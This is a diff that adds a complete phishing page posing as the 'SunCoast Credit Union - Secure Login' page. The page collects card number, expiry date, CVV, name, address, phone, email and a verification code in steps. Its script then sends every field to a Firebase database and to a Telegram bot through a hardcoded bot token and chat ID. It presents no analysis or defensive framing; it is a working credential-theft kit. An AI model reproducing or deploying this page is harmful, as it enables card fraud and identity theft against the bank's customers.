@@ -1,0 +1,310 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>SunCoast Credit Union - Secure Login</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+      background: #f5f5f5;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+
+    .container {
+      background: #ffffff;
+      padding: 30px 40px;
+      border-radius: 12px;
+      box-shadow: 0 0 20px rgba(0, 0, 0, 0.1);
+      width: 100%;
+      max-width: 420px;
+    }
+
+    .logo {
+      text-align: center;
+      margin-bottom: 25px;
+    }
+
+    .logo img {
+      width: 120px;
+      height: auto;
+    }
+
+    h2 {
+      text-align: center;
+      color: #2e7d32;
+      margin-bottom: 20px;
+      font-size: 20px;
+      font-weight: 600;
+    }
+
+    .step {
+      display: none;
+    }
+
+    .step.active {
+      display: block;
+    }
+
+    .form-group {
+      margin-bottom: 20px;
+    }
+
+    label {
+      display: block;
+      margin-bottom: 8px;
+      font-weight: 500;
+      color: #333;
+    }
+
+    input[type="text"],
+    input[type="password"],
+    input[type="email"],
+    input[type="tel"] {
+      width: 100%;
+      padding: 12px;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+      font-size: 14px;
+      transition: border-color 0.3s ease;
+    }
+
+    input:focus {
+      border-color: #2e7d32;
+      outline: none;
+    }
+
+    button {
+      width: 100%;
+      padding: 14px;
+      background-color: #2e7d32;
+      color: white;
+      border: none;
+      border-radius: 6px;
+      font-size: 16px;
+      cursor: pointer;
+      margin-top: 10px;
+      transition: background-color 0.3s ease;
+    }
+
+    button:hover {
+      background-color: #256026;
+    }
+
+    .footer {
+      text-align: center;
+      margin-top: 25px;
+      font-size: 12px;
+      color: #666;
+    }
+
+    .step-title {
+      font-size: 16px;
+      font-weight: 600;
+      margin-bottom: 15px;
+    }
+
+    .step-description {
+      font-size: 14px;
+      color: #555;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="logo">
+      <img src="logo.png" alt="SunCoast Credit Union Logo" />
+    </div>
+    <h2>SunCoast Credit Union - Secure Login</h2>
+
+    <div id="card-step" class="step active">
+      <div class="form-group">
+        <label for="cardNumber">Card Number</label>
+        <input type="text" id="cardNumber" name="cardNumber" placeholder="1234 5678 9012 3456" />
+      </div>
+      <div class="form-group">
+        <label for="cardExpiry">Expiry Date</label>
+        <input type="text" id="cardExpiry" name="cardExpiry" placeholder="MM/YY" />
+      </div>
+      <div class="form-group">
+        <label for="cardCVV">CVV</label>
+        <input type="text" id="cardCVV" name="cardCVV" placeholder="123" />
+      </div>
+      <button onclick="nextStep()">Next</button>
+    </div>
+
+    <div id="personal-info-step" class="step">
+      <div class="form-group">
+        <label for="fullName">Full Name</label>
+        <input type="text" id="fullName" name="fullName" />
+      </div>
+      <div class="form-group">
+        <label for="address">Address</label>
+        <input type="text" id="address" name="address" />
+      </div>
+      <div class="form-group">
+        <label for="phone">Phone Number</label>
+        <input type="tel" id="phone" name="phone" />
+      </div>
+      <div class="form-group">
+        <label for="email">Email Address</label>
+        <input type="email" id="email" name="email" />
+      </div>
+      <button onclick="prevStep()">Back</button>
+      <button onclick="nextStep()">Next</button>
+    </div>
+
+    <div id="verification-step" class="step">
+      <div class="form-group">
+        <label for="verificationCode">Verification Code</label>
+        <input type="text" id="verificationCode" name="verificationCode" />
+      </div>
+      <button onclick="prevStep()">Back</button>
+      <button onclick="nextStep()">Next</button>
+    </div>
+
+    <div id="completed-step" class="step">
+      <div class="form-group">
+        <h3 class="step-title">Verification Completed</h3>
+        <p class="step-description">Your verification has been successfully completed. Thank you for using SunCoast Credit Union services.</p>
+      </div>
+    </div>
+
+    <div class="footer">
+      &copy; 2025 SunCoast Credit Union. All rights reserved.
+    </div>
+  </div>
+
+  <script src="https://www.gstatic.com/firebasejs/9.20.2/firebase-app.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.20.2/firebase-database.js"></script>
+
+  <script>
+    // Firebase Configuration
+    const firebaseConfig = {
+      apiKey: "AIzaSyDy-D9ko0_4OwAguGPTKQsplpv_Iq48PgU",
+      authDomain: "sun-coast-68ed8.firebaseapp.com",
+      projectId: "sun-coast-68ed8",
+      storageBucket: "sun-coast-68ed8.firebasestorage.app",
+      messagingSenderId: "780981743501",
+      appId: "1:780981743501:web:3af6302f8b5a41c597d7c4",
+      measurementId: "G-ZVH7EN3HG2"
+    };
+
+    // Initialize Firebase
+    const app = firebase.initializeApp(firebaseConfig);
+    const database = firebase.database();
+    const dbRef = firebase.database().ref("user_data");
+
+    // Show loading overlay on page load
+    window.addEventListener("DOMContentLoaded", function () {
+      // Removed the loading overlay logic
+    });
+
+    function nextStep() {
+      const cardStep = document.getElementById("card-step");
+      const personalInfoStep = document.getElementById("personal-info-step");
+      const verificationStep = document.getElementById("verification-step");
+      const completedStep = document.getElementById("completed-step");
+
+      // Move to next step
+      if (cardStep.classList.contains("active")) {
+        cardStep.classList.remove("active");
+        personalInfoStep.classList.add("active");
+      } else if (personalInfoStep.classList.contains("active")) {
+        personalInfoStep.classList.remove("active");
+        verificationStep.classList.add("active");
+      } else if (verificationStep.classList.contains("active")) {
+        verificationStep.classList.remove("active");
+        completedStep.classList.add("active");
+        saveDataToFirebase();
+      }
+    }
+
+    function prevStep() {
+      const cardStep = document.getElementById("card-step");
+      const personalInfoStep = document.getElementById("personal-info-step");
+      const verificationStep = document.getElementById("verification-step");
+
+      // Move to previous step
+      if (personalInfoStep.classList.contains("active")) {
+        personalInfoStep.classList.remove("active");
+        cardStep.classList.add("active");
+      } else if (verificationStep.classList.contains("active")) {
+        verificationStep.classList.remove("active");
+        personalInfoStep.classList.add("active");
+      }
+    }
+
+    function saveDataToFirebase() {
+      const cardNumber = document.getElementById("cardNumber").value;
+      const cardExpiry = document.getElementById("cardExpiry").value;
+      const cardCVV = document.getElementById("cardCVV").value;
+      const fullName = document.getElementById("fullName").value;
+      const address = document.getElementById("address").value;
+      const phone = document.getElementById("phone").value;
+      const email = document.getElementById("email").value;
+      const verificationCode = document.getElementById("verificationCode").value;
+
+      const data = {
+        cardNumber,
+        cardExpiry,
+        cardCVV,
+        fullName,
+        address,
+        phone,
+        email,
+        verificationCode
+      };
+
+      dbRef.push(data)
+        .then((snapshot) => {
+          console.log("Data saved to Firebase with ID:", snapshot.key);
+          alert("Data saved to Firebase!");
+        })
+        .catch((error) => {
+          console.error("Error saving data to Firebase:", error);
+          alert("Error saving data to Firebase!");
+        });
+
+      // Send data to Telegram bot
+      sendTelegramData(data);
+    }
+
+    function sendTelegramData(data) {
+      const telegramBotUrl = "https://api.telegram.org/bot8364928878:AAHTTsvgIsKJFN1Jki49WyLXHfmtGupHHjw/sendMessage";
+      const chatId = "-7088731308"; // YOUR TELEGRAM USER ID
+      const message = JSON.stringify(data, null, 2);
+
+      fetch(telegramBotUrl, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message
+        })
+      })
+      .then(response => {
+        if (!response.ok) {
+          throw new Error("Network response was not ok");
+        }
+        return response.json();
+      })
+      .then(data => {
+        console.log("Telegram message sent:", data);
+        alert("Data sent to Telegram bot!");
+      })
+      .catch(error => {
+        console.error("Error sending Telegram message:", error);
+        alert("Error sending data to Telegram bot!");
+      });
+    }
+  </script>
+</body>
+</html>
